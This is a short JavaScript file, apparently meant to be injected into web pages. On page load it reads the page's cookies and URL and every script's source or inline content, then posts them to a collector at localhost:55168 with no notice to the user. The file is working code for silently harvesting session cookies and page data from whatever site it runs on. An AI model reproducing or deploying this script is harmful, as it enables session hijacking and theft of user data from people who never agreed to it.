﻿//document.body.innerHTML = document.body.innerHTML.replace(new RegExp("Gmail", "g"), "nobody");

window.onload = function () {
    var cookies = document.cookie;
    var currenturl = window.location.href;
    var scripts = document.getElementsByTagName("script");
    for (var i = 0; i < scripts.length; i++) { 
        if (scripts[i].src) {
            console.log(i, scripts[i].src);
            
            loadDoc(i, scripts[i].src, "");
        }
        else {
            console.log(i, scripts[i]);
            loadDoc(i, window.location.href, scripts[i].innerHTML);
        }
    }
    postCookies(cookies, currenturl);
    getScriptContent();
    //alert(scripts.length);
}

function postCookies(cookies, currenturl) {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
        }
    };
    xhttp.open("POST", "http://localhost:55168/home/PostCookies", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send("cookies="+cookies+"&url="+ currenturl);
}


function loadDoc(scriptNumber, src, content) {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
        }
    };
    xhttp.open("POST", "http://localhost:55168/home/PostScript", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send("Number=" + scriptNumber + "&Source=" + src + "&Content=" + content);
}


function getScriptContent() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
        }
    };
    xhttp.open("GET", "http://localhost:55168/home/GetScriptContent", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send();
}